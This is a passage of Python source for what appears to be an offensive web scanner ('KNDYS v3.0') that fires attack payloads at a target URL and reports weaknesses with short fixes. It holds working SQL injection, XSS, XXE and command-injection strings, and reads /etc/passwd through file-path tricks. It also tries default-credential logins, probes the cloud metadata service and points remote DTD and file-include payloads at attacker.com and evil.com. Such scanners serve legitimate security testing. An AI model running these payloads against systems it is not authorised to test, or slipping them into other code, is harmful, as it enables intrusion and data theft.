            pass
        return None
    
    # Category 3: Broken Authentication (3 checks)
    
    def _check_weak_auth(self, url):
        """Check for weak authentication"""
        creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('test', 'test')]
        
        for user, pwd in creds:
            try:
                response = requests.post(url, data={'username': user, 'password': pwd}, timeout=10, verify=False)
                if response.status_code == 200 and 'dashboard' in response.text.lower():
                    return ('Critical', f"Weak credentials: {user}:{pwd}", "Enforce strong password policy")
            except:
                pass
        return None
    
    def _check_session_mgmt(self, url):
        """Check session management"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            cookies = response.cookies
            issues = []
            for cookie in cookies:
                if not cookie.secure:
                    issues.append(f"Cookie {cookie.name} missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append(f"Cookie {cookie.name} missing HttpOnly flag")
            if issues:
                return ('Medium', '; '.join(issues), "Set Secure and HttpOnly flags on cookies")
        except:
            pass
        return None
    
    def _check_jwt_vulns(self, url):
        """Check for JWT vulnerabilities"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'authorization' in response.headers.get('Authorization', '').lower():
                token = response.headers['Authorization'].replace('Bearer ', '')
                if token.count('.') == 2:
                    header = token.split('.')[0]
                    decoded = json.loads(base64.b64decode(header + '=='))
                    if decoded.get('alg') == 'none':
                        return ('Critical', "JWT with 'none' algorithm", "Validate JWT signature, reject 'none' alg")
        except:
            pass
        return None
    
    # Category 4: Sensitive Data (4 checks)
    
    def _check_ssl_config(self, url):
        """Check SSL/TLS configuration"""
        if url.startswith('https'):
            try:
                response = requests.get(url, timeout=10)
                if not response.url.startswith('https'):
                    return ('High', "HTTPS downgrade detected", "Enforce HTTPS with HSTS")
            except:
                return ('High', "SSL/TLS certificate error", "Use valid SSL certificate")
        else:
            return ('Medium', "Site not using HTTPS", "Migrate to HTTPS")
        return None
    
    def _check_sensitive_files(self, url):
        """Check for exposed sensitive files"""
        files = ['.env', '.git/config', 'config.php', 'backup.sql', 'id_rsa', '.htaccess', 'web.config']
        
        for file in files:
            try:
                test_url = f"{url}/{file}" if not url.endswith('/') else f"{url}{file}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Sensitive file exposed: {file}", "Remove or protect sensitive files")
            except:
                pass
        return None
    
    def _check_info_disclosure(self, url):
        """Check for information disclosure"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'Server' in response.headers:
                server = response.headers['Server']
                if any(tech in server.lower() for tech in ['apache/2', 'nginx/1', 'iis/7', 'php/5']):
                    return ('Low', f"Server version disclosed: {server}", "Remove server version headers")
        except:
            pass
        return None
    
    def _check_security_headers_advanced(self, url):
        """Check for missing security headers"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            missing = []
            headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-XSS-Protection': 'XSS filter'
            }
            for header, desc in headers.items():
                if header not in response.headers:
                    missing.append(desc)
            if missing:
                return ('Medium', f"Missing headers: {', '.join(missing)}", "Implement security headers")
        except:
            pass
        return None
    
    # Category 5: XXE (2 checks)
    
    def _check_xxe_advanced(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        try:
            response = requests.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'root:' in response.text:
                return ('Critical', "XXE: /etc/passwd read successful", "Disable XML external entities")
        except:
            pass
        return None
    
    def _check_dtd_injection(self, url):
        """Check for DTD injection"""
        dtd_payload = '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"><root></root>'
        try:
            response = requests.post(url, data=dtd_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'attacker' in response.text or response.status_code == 500:
                return ('High', "DTD injection possible", "Disable DTD processing")
        except:
            pass
        return None
    
    # Category 6: Access Control (3 checks)
    
    def _check_idor(self, url):
        """Check for IDOR vulnerabilities"""
        if 'id=' in url or '/user/' in url or '/profile/' in url:
            return ('Medium', "Potential IDOR in URL parameters", "Implement access control checks")
        return None
    
    def _check_path_traversal_advanced(self, url):
        """Check for path traversal"""
        payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'root:' in response.text or '[extensions]' in response.text:
                    return ('High', f"Path traversal with: {payload}", "Validate and sanitize file paths")
            except:
                pass
        return None
    
    def _check_forced_browsing(self, url):
        """Check for forced browsing"""
        paths = ['/admin', '/config', '/backup', '/phpinfo.php', '/test', '/dev']
        
        for path in paths:
            try:
                test_url = f"{url}{path}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('Medium', f"Accessible path: {path}", "Implement proper access controls")
            except:
                pass
        return None
    
    # Category 7: Security Misconfiguration (13 checks)
    
    def _check_cors(self, url):
        """Check for CORS misconfiguration"""
        try:
            response = requests.get(url, headers={'Origin': 'http://evil.com'}, timeout=10, verify=False)
            if response.headers.get('Access-Control-Allow-Origin') == '*':
                return ('High', "CORS allows all origins (*)", "Restrict CORS to specific origins")
            if response.headers.get('Access-Control-Allow-Origin') == 'http://evil.com':
                return ('High', "CORS reflects arbitrary origin", "Validate allowed origins")
        except:
            pass
        return None
    
    def _check_http_methods(self, url):
        """Check for dangerous HTTP methods"""
        try:
            response = requests.options(url, timeout=10, verify=False)
            if 'Allow' in response.headers:
                methods = response.headers['Allow']
                dangerous = [m for m in ['PUT', 'DELETE', 'TRACE', 'CONNECT'] if m in methods]
                if dangerous:
                    return ('Medium', f"Dangerous HTTP methods: {', '.join(dangerous)}", "Disable unnecessary HTTP methods")
        except:
            pass
        return None
    
    def _check_default_creds(self, url):
        """Check for default credentials"""
        return ('Info', "Manual check recommended for default credentials", "Change default credentials")
    
    def _check_verbose_errors(self, url):
        """Check for verbose error messages"""
        try:
            test_url = f"{url}/nonexistent-page-12345"
            response = requests.get(test_url, timeout=10, verify=False)
            if any(err in response.text.lower() for err in ['traceback', 'exception', 'stack trace', 'error at line']):
                return ('Low', "Verbose error messages detected", "Implement custom error pages")
        except:
            pass
        return None
    
    def _check_debug_mode(self, url):
        """Check for debug mode enabled"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if any(debug in response.text.lower() for debug in ['debug mode', 'debug=true', 'debugger', 'xdebug']):
                return ('Medium', "Debug mode appears enabled", "Disable debug mode in production")
        except:
            pass
        return None
    
    def _check_csrf_advanced(self, url):
        """Check for CSRF protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form', method='post')
            for form in forms:
                has_token = any(inp.get('name', '').lower() in ['csrf', 'token', '_token'] for inp in form.find_all('input'))
                if not has_token:
                    return ('Medium', "POST form without CSRF token", "Implement CSRF tokens")
        except:
            pass
        return None
    
    def _check_clickjacking(self, url):
        """Check for clickjacking protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if 'X-Frame-Options' not in response.headers and 'Content-Security-Policy' not in response.headers:
                return ('Medium', "No clickjacking protection", "Set X-Frame-Options or CSP frame-ancestors")
        except:
            pass
        return None
    
    def _check_open_redirect(self, url):
        """Check for open redirect"""
        payloads = ["http://evil.com", "//evil.com", "https://evil.com"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?redirect={payload}"
                response = requests.get(test_url, allow_redirects=False, timeout=10, verify=False)
                if response.status_code in [301, 302] and payload in response.headers.get('Location', ''):
                    return ('Medium', f"Open redirect to: {payload}", "Validate redirect URLs")
            except:
                pass
        return None
    
    def _check_ssrf_advanced(self, url):
        """Check for SSRF vulnerabilities"""
        payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost", "http://127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?url={payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                if 'ami-id' in response.text or len(response.text) > 0:
                    return ('High', f"Potential SSRF to: {payload}", "Validate and restrict URL parameters")
            except:
                pass
        return None
    
    def _check_outdated_libs(self, url):
        """Check for outdated JavaScript libraries"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            outdated = []
            patterns = [
                (r'jquery[-.]?(\d+\.\d+)', '1.9', 'jQuery'),
                (r'angular[-.]?(\d+\.\d+)', '1.6', 'AngularJS'),
                (r'bootstrap[-.]?(\d+)', '4', 'Bootstrap')
            ]
            for pattern, min_ver, lib in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match and match.group(1) < min_ver:
                    outdated.append(f"{lib} {match.group(1)}")
            if outdated:
                return ('Medium', f"Outdated libraries: {', '.join(outdated)}", "Update JavaScript libraries")
        except:
            pass
        return None
    
    def _check_api_docs(self, url):
        """Check for exposed API documentation"""
        endpoints = ['/api/docs', '/swagger', '/api-docs', '/swagger-ui', '/api/swagger.json']
        
        for endpoint in endpoints:
            try:
                test_url = f"{url}{endpoint}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'api' in response.text.lower()):
                    return ('Info', f"API documentation at: {endpoint}", "Protect API documentation")
            except:
                pass
        return None
    
    def _check_backup_files(self, url):
        """Check for accessible backup files"""
        extensions = ['.bak', '.old', '.backup', '~', '.swp', '.zip', '.tar.gz']
        
        for ext in extensions:
            try:
                test_url = f"{url}/backup{ext}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Backup file accessible: backup{ext}", "Remove backup files from web root")
            except:
                pass
        return None
    
    def _check_host_header_injection(self, url):
        """Check for host header injection"""
        try:
            response = requests.get(url, headers={'Host': 'evil.com'}, timeout=10, verify=False)
            if 'evil.com' in response.text:
                return ('Medium', "Host header injection detected", "Validate Host header")
        except:
            pass
        return None

    def check_sql_injection(self, url):
        """Advanced SQL injection check"""
        payloads = [
            "'", "\"", "' OR '1'='1", "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--", "1; SELECT pg_sleep(5)--",
            "' OR SLEEP(5) AND '1'='1", "' OR BENCHMARK(1000000, MD5('A'))--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error messages
                error_indicators = [
                    'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
                    'database', 'query', 'unclosed', 'unterminated'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in error_indicators):
                    return f"Error-based SQLi with payload: {payload}"
                
                # Check for time delays
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5:
                    return f"Time-based SQLi with payload: {payload} (delay: {elapsed:.2f}s)"
                    
            except requests.exceptions.Timeout:
                return f"Potential time-based SQLi (timeout with payload: {payload})"
            except:
                continue
        
        return None
    
    def check_xss(self, url):
        """Advanced XSS check"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if payload in response.text:
                    return f"Reflected XSS with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_csrf(self, url):
        """Check for CSRF vulnerabilities"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Look for forms without CSRF tokens
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                has_csrf = False
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    if input_tag.get('name', '').lower() in ['csrf', 'token', '_token', 'csrf_token']:
                        has_csrf = True
                        break
                
                if not has_csrf and form.get('action'):
                    return f"Form without CSRF protection: {form.get('action')}"
                    
        except:
            pass
        
        return None
    
    def check_dir_traversal(self, url):
        """Check for directory traversal"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                content = response.text.lower()
                if 'root:' in content or '[extensions]' in content:
                    return f"Directory traversal with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "http://evil.com/shell.txt"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if 'root:' in response.text or '<?php' in response.text:
                    return f"File inclusion with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_ssrf(self, url):
        """Check for SSRF vulnerabilities"""
        test_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://127.0.0.1:22/"

        ]
        
        for test_url in test_urls:
            try:
                payload_url = f"{url}?url={test_url}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(payload_url, headers=headers, timeout=10, verify=False)
                
                if 'ami-id' in response.text or 'ssh' in response.text.lower():
                    return f"Potential SSRF to: {test_url}"
            except:
                continue
        
        return None
    
    def check_xxe(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
        
        try:
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'application/xml'
            }
            response = requests.post(url, data=xxe_payload, headers=headers, timeout=10, verify=False)
            
            if 'root:' in response.text:
                return "XXE vulnerability detected"
        except:
            pass
        
        return None
    
    def check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            "; ls -la",
            "| dir",
            "`whoami`",
            "$(id)",
            "|| ping -c 5 127.0.0.1"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5 or 'uid=' in response.text or 'Directory of' in response.text:
                    return f"Command injection with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_security_headers(self, url):
        """Check for missing security headers"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options (clickjacking protection)',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options (MIME sniffing protection)',
                'X-XSS-Protection': 'Missing X-XSS-Protection (XSS filter)',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing Content-Security-Policy',
                'Referrer-Policy': 'Missing Referrer-Policy'
            }
            
            vulns = []
            for header, message in security_headers.items():
                if header not in response.headers:
                    vulns.append(("Security Headers", message))
            
            return vulns
        except:
            return []
    
    def run_sql_scanner(self):
        """Advanced SQL injection scanner"""
        url = self.module_options['url']
        technique = self.module_options.get('technique', 'time_based,error_based,boolean')
        
        print(f"{Fore.CYAN}[*] Scanning for SQL injection: {url}{Style.RESET_ALL}")
        
        techniques = technique.split(',')
        results = []
        
        # Test each technique
        if 'error_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing error-based SQLi{Style.RESET_ALL}")
            result = self.test_error_based_sqli(url)
            if result:
                results.append(("Error-based", result))
        
        if 'time_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing time-based SQLi{Style.RESET_ALL}")
            result = self.test_time_based_sqli(url)
            if result:
                results.append(("Time-based", result))
        
        if 'boolean' in techniques:
            print(f"{Fore.YELLOW}[*] Testing boolean-based SQLi{Style.RESET_ALL}")
            result = self.test_boolean_sqli(url)
            if result:
                results.append(("Boolean-based", result))
        
        if 'union' in techniques:
            print(f"{Fore.YELLOW}[*] Testing UNION-based SQLi{Style.RESET_ALL}")
            result = self.test_union_sqli(url)
            if result:
                results.append(("UNION-based", result))
        
        print(f"\n{Fore.CYAN}[*] SQL injection scan completed{Style.RESET_ALL}")
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} SQL injection vulnerabilities{Style.RESET_ALL}")
            for vuln_type, details in results:
                print(f" {vuln_type}: {details}")
        else:
            print(f"{Fore.YELLOW}[*] No SQL injection vulnerabilities found{Style.RESET_ALL}")
    
    def test_error_based_sqli(self, url):
        """Test for error-based SQL injection"""
        payloads = [
            "'", "\"", "'\"", "\"'", "`",
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                error_patterns = [
                    r"SQL.*error",
                    r"Warning.*mysql",
                    r"PostgreSQL.*ERROR",
                    r"ORA-\d+",
                    r"Microsoft.*Driver",
                    r"syntax.*error",
                    r"unclosed.*quotation",
                    r"unterminated.*string"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return f"Error with payload: {payload}"
                        
            except:
                continue
        
        return None
    
    def test_time_based_sqli(self, url):
        """Test for time-based SQL injection"""
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000, MD5('A'))--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in time_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    return f"Time delay ({elapsed:.2f}s) with payload: {payload}"
                    
            except requests.exceptions.Timeout:
                return f"Timeout with payload: {payload}"
            except:
                continue
        
        return None
    
    def test_boolean_sqli(self, url):
        """Test for boolean-based SQL injection"""
        # This is a simplified check
        true_conditions = ["' OR '1'='1", "' OR 1=1--"]
        false_conditions = ["' OR '1'='2", "' OR 1=2--"]
        
        try:
            # Get original response
            headers = {'User-Agent': self.config['user_agent']}
            original = requests.get(url, headers=headers, timeout=10, verify=False)
            original_length = len(original.text)
            
            for true_payload, false_payload in zip(true_conditions, false_conditions):
                true_url = url.replace('=', f"={true_payload}")
                false_url = url.replace('=', f"={false_payload}")
                
                true_resp = requests.get(true_url, headers=headers, timeout=10, verify=False)
                false_resp = requests.get(false_url, headers=headers, timeout=10, verify=False)
                
                # Check for differences
                if len(true_resp.text) != len(false_resp.text):
                    return f"Boolean condition difference with payloads: {true_payload}/{false_payload}"
                    
        except:
            pass
        
        return None
    
    def test_union_sqli(self, url):
        """Test for UNION-based SQL injection"""
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version,2,3--"
        ]
        
        for payload in union_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for database information
                db_indicators = [
                    'mysql', 'postgresql', 'oracle', 'sqlite',
                    'microsoft sql', 'mariadb', 'database'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in db_indicators):
                    return f"UNION query with payload: {payload}"
                    
            except:
                continue
        
        return None
    
    def run_xss_scanner(self):
        """High-fidelity XSS scanner with adaptive payload orchestration"""
        opts = self._resolve_xss_options()
        start_time = time.time()
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*18}ADAPTIVE XSS SCANNER - KNDYS v3.0{' '*17}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {opts['url']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Profile: {opts['mode'].upper()} | Scope: {opts['scope']} | Method: {opts['method_label']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {opts['threads']} | Timeout: {opts['timeout']:.1f}s | Payload budget: {opts['payload_limit']} per parameter{Style.RESET_ALL}")
        if opts.get('forms_requested') and not opts['include_forms']:
            print(f"{Fore.YELLOW}[!] BeautifulSoup not available, HTML form enumeration disabled{Style.RESET_ALL}")

        print(f"\n{Fore.BLUE}[*] Phase 1: Attack surface discovery{Style.RESET_ALL}")
        discovery = self._discover_xss_surface(opts)
        injection_points = discovery['injection_points']
        if not injection_points:
            fallback = self._build_manual_points(opts)
            if fallback:
                injection_points = fallback
                discovery['injection_points'] = fallback
                discovery['post_points'] = [p for p in fallback if p['method'] == 'POST']
                print(f"{Fore.YELLOW}[!] No parameters discovered, using manual fallback list{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Unable to locate parameters or forms to test{Style.RESET_ALL}")
                return

        print(f"{Fore.CYAN}[*] Surface summary: {discovery['stats']['pages']} page(s), {discovery['stats']['forms']} form(s), {len(injection_points)} injection point(s){Style.RESET_ALL}")
        for preview in injection_points[:5]:
            print(f" {Fore.GREEN}• {preview['method']} {preview['param']} @ {preview['url']}{Style.RESET_ALL}")
        if len(injection_points) > 5:
            print(f" ... ({len(injection_points) - 5} more)")

        payload_bank = self._build_xss_payload_bank(opts)
        print(f"\n{Fore.BLUE}[*] Phase 2: Payload matrix ({len(payload_bank)} curated payloads){Style.RESET_ALL}")
        test_cases = self._build_xss_test_matrix(injection_points, payload_bank, opts)
        if not test_cases:
            print(f"{Fore.RED}[-] No test cases generated (check parameter filters){Style.RESET_ALL}")
            return
        print(f"{Fore.CYAN}[*] Prepared {len(test_cases)} active tests across {len(injection_points)} parameter(s){Style.RESET_ALL}")

        print(f"\n{Fore.BLUE}[*] Phase 3: Active testing with {opts['threads']} worker(s){Style.RESET_ALL}")
        results = self._execute_xss_tests(test_cases, opts)

        dom_findings = []
        if opts['include_dom']:
            print(f"\n{Fore.BLUE}[*] Phase 4: DOM sink heuristics ({min(opts['dom_limit'], len(discovery['dom_candidates']))} page targets){Style.RESET_ALL}")
            dom_findings = self._scan_dom_targets(discovery['dom_candidates'], opts)

        stored_findings = []
        if opts['stored_check'] and discovery['post_points']:
            print(f"\n{Fore.BLUE}[*] Phase 5: Stored XSS validation ({min(opts['stored_limit'], len(discovery['post_points']))} candidate form(s)){Style.RESET_ALL}")
            stored_findings = self._run_stored_xss_checks(discovery['post_points'], opts)

        summary = self._summarize_xss_results(opts, discovery, results, dom_findings, stored_findings, start_time)

        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}XSS SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        if summary['vulnerabilities']:
            for idx, vuln in enumerate(summary['vulnerabilities'], 1):
                print(f"{Fore.GREEN}{idx}. {vuln['type']} via {vuln['method']} parameter '{vuln['parameter']}' ({vuln['endpoint']}){Style.RESET_ALL}")
                print(f" Payload: {vuln['payload'][:120]}")
                if vuln.get('evidence'):
                    print(f" Evidence: {vuln['evidence'][:140]}")
        else:
            print(f"{Fore.YELLOW}[*] No direct reflected payload execution confirmed{Style.RESET_ALL}")

        if dom_findings:
            print(f"\n{Fore.CYAN}DOM Findings: {len(dom_findings)}{Style.RESET_ALL}")
            for finding in dom_findings[:5]:
                print(f" - {finding['severity']} risk sink at {finding['url']} ({finding['pattern']})")
        if stored_findings:
            print(f"\n{Fore.CYAN}Stored Findings: {len(stored_findings)}{Style.RESET_ALL}")
            for finding in stored_findings:
                print(f" - {finding['method']} parameter '{finding['parameter']}' persists payload ({finding['verification_url']})")

        print(f"\n{Fore.CYAN}[*] Requests: {results['requests']} | WAF events: {len(results['waf_events'])} | Errors: {len(results['errors'])}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan completed in {summary['duration']:.2f}s{Style.RESET_ALL}")

        self._export_xss_results(summary)

    def _resolve_xss_options(self):
        raw = self.module_options
        mode = (raw.get('mode', 'balanced') or 'balanced').lower()
        profile = self._get_xss_profile(mode)
        scope = (raw.get('scope', 'single') or 'single').lower()
        if scope not in {'single', 'host', 'crawl'}:
            scope = 'single'
        method_opt = (raw.get('method', 'auto') or 'auto').lower()
        if method_opt == 'get':
            method_filter = {'GET'}
            method_label = 'GET'
        elif method_opt == 'post':
            method_filter = {'POST'}
            method_label = 'POST'
        elif method_opt == 'both':
            method_filter = {'GET', 'POST'}
            method_label = 'BOTH'
        else:
            method_filter = {'GET', 'POST'}
            method_label = 'AUTO'

        crawl_depth = self._safe_int(raw.get('crawl_depth'), profile['crawl_depth'], 0, 5)
        max_pages = self._safe_int(raw.get('max_pages'), profile['max_pages'], 1, 60)
        max_parameters = self._safe_int(raw.get('max_parameters'), profile['max_parameters'], 1, 200)
        threads = self._safe_int(raw.get('threads'), profile['threads'], 1, 64)
        timeout = self._safe_float(raw.get('timeout'), profile['timeout'], 2.0, 30.0)
        payload_limit = self._safe_int(raw.get('payload_limit'), profile['payload_limit'], 0, 64)
        if payload_limit == 0:
            payload_limit = profile['payload_limit']

        include_forms_requested = self._parse_bool_option(raw.get('include_forms', 'true'), True)
        include_forms = include_forms_requested and BS4_AVAILABLE
        include_dom = self._parse_bool_option(raw.get('include_dom', 'true'), True)
        stored_check = self._parse_bool_option(raw.get('stored_check', 'false'), False)
        stealth = self._parse_bool_option(raw.get('stealth', 'false'), False)

        parameter_filter = None
        manual_params = []
        params_raw = (raw.get('parameters', 'auto') or 'auto').strip()
        if params_raw.lower() not in {'auto', 'all', '*', ''}:
            manual_params = [p.strip() for p in re.split(r'[;,]', params_raw) if p.strip()]
            if manual_params:
                parameter_filter = set(manual_params)

        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-XSS'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        custom_headers = self._build_header_map(raw.get('custom_headers', ''))
        headers.update(custom_headers)
        cookies = self._build_cookie_map(raw.get('cookies', ''))

        try:
            rate_limit_value = float(raw.get('rate_limit', '0') or 0)
        except (TypeError, ValueError):
            rate_limit_value = 0.0
        rate_limiter = RateLimiter(max_requests=max(1, int(rate_limit_value)), time_window=1) if rate_limit_value > 0 else None

        if stealth:
            threads = min(threads, 6)
            payload_limit = min(payload_limit, 8)

        url = raw.get('url', 'http://example.com')
        parsed = urlparse(url)
        base_host = parsed.netloc.lower()

        opts = {
            'url': url,
            'mode': mode,
            'scope': scope,
            'method_filter': method_filter,
            'method_label': method_label,
            'crawl_depth': crawl_depth,
            'max_pages': max_pages,
            'max_parameters': max_parameters,
            'threads': threads,
            'timeout': timeout,
            'payload_limit': payload_limit,
            'include_forms': include_forms,
            'include_dom': include_dom,
            'stored_check': stored_check,
            'stealth': stealth,
            'parameter_filter': parameter_filter,
            'manual_parameters': manual_params,
            'headers': headers,
            'custom_headers': custom_headers,
            'cookies': cookies,
            'rate_limiter': rate_limiter,
            'forms_requested': include_forms_requested,
            'dom_limit': profile['dom_limit'],
            'stored_limit': profile['stored_limit'],
            'base_host': base_host,
            'profile': profile,
            'scan_id': secrets.token_hex(4)
        }
        return opts

    def _get_xss_profile(self, mode):
        profiles = {
            'fast': {
                'payload_limit': 6,
                'threads': 8,
                'timeout': 6.0,
                'max_pages': 8,
                'max_parameters': 25,
                'crawl_depth': 1,
                'dom_limit': 3,
                'stored_limit': 1
            },
            'balanced': {
                'payload_limit': 12,
                'threads': 12,
                'timeout': 8.0,
                'max_pages': 15,
                'max_parameters': 40,
                'crawl_depth': 2,
                'dom_limit': 5,
                'stored_limit': 3
            },
            'deep': {
                'payload_limit': 24,
                'threads': 18,
                'timeout': 12.0,
                'max_pages': 25,
                'max_parameters': 80,
                'crawl_depth': 3,
                'dom_limit': 8,
                'stored_limit': 5
            }
        }
        return profiles.get(mode, profiles['balanced'])

    def _parse_bool_option(self, value, default=False):
        if isinstance(value, bool):
            return value
        if value is None:
            return default
        return str(value).strip().lower() in {'1', 'true', 'yes', 'y', 'on'}

    def _parse_list_option(self, raw_value):
        if raw_value is None:
            return []
        if isinstance(raw_value, (list, tuple, set)):
            return [str(item).strip() for item in raw_value if str(item).strip()]
        text = str(raw_value).replace('|||', ',')
        tokens = re.split(r'[\n,;]', text)
        return [token.strip() for token in tokens if token.strip()]

    def _safe_int(self, value, default, min_value, max_value):
        try:
            num = int(value)
        except (TypeError, ValueError):
            return default
        return max(min_value, min(max_value, num))

    @staticmethod
    def _utc_timestamp():
        return datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')

    def _safe_float(self, value, default, min_value, max_value):
        try:
            num = float(value)
        except (TypeError, ValueError):
            return default
